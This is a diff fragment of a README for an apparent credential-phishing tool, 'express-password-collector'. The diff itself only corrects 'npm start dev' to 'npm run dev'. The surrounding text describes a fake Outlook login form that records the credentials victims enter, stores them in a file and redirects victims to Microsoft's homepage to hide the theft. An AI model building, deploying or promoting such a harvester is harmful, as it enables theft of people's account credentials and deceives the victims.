@@ -15,7 +15,7 @@ let password = sessionStorage.getItem("password");
 ```
 #### express-password-collector install
 #Just run command ```npm install``` in project dir. <br />
-To start API, run command ```npm start dev```.
+To start API, run command ```npm run dev```.
 
 Now go to localhost:5000 and you can see the loginform. when u put your user credentials and try login to Outlook, API collect the wanted informations and redirect you to microsoft homepage. The user credentials is saved to project dir in result file and you can see them from console too.
 
